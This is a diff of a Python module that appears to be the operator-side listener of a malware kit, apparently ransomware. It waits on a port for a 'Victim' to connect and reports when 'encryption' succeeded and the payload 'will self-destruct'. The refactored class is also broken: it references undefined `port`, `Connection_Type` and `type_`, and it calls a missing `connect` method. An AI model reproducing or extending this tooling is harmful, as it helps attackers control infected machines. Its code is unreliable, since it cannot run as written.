@@ -1,31 +1,43 @@
-def connect(Connection_Type: str, port: int):
-    import socket
-    import os
-    from os import path
-    import sys
-    if os.name == 'nt':
-        from colorama import init
-        init(convert=True)
-    sys.path.insert(0, path.dirname(path.dirname(path.dirname(__file__))))
-    from core.helper_core import Color
-    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
-    if Connection_Type == "TCP":
-        Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    elif Connection_Type == "UDP":
-        Connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+import socket
+import os
+from os import path
 
-    print("[" + blue + 'REPORT' + reset + "]  Making Connection")
-    try:
-        Connection.bind(('', int(port)))
-        Connection.listen()
-        Victim, Address = Connection.accept()
+if os.name == 'nt':
+    from colorama import init
+    init(convert=True)
 
-        Connected = True
-        while Connected:
-            if Connection.recv(1024).decode("UTF-8") == "->|" :
-                print("Encryption was succesful . payload will self-destruct")
+from core.helper_core import notify
 
-    except:
-        Connected = False
-        print("[" + red + '-' + reset +
-              "] Connection Failed.Victim Might Be Offline Try Again Later")
+class Controller:
+    def __init__(self, conn_type, port):
+        
+        notify("notify","Making Connection", "")
+        try:
+            self.get_socket(conn_type)
+            self.make_the_connection()
+            connected = True
+            while connected:
+                result = self.conn.recv(1024)
+                if result == "->|":
+                    print("Operation was succesful . Payload will self destruct")
+                else :
+                    print(result)
+
+        except:
+            connected = False
+            notify("problem",
+                  "Connection Failed.Victim Might Be Offline Try Again Later")
+
+    def make_the_connection(self):
+        self.connection.bind(('', int(port)))
+        self.connection.listen()
+        self.conn, self.address = self.connection.accept()
+
+    def get_socket(self, conn_type):
+        if conn_type == "TCP":
+            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        elif Connection_Type == "UDP":
+            self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+def connect(connection_type: str, port: int):
+    Controller().connect(connection_type, port, type_)
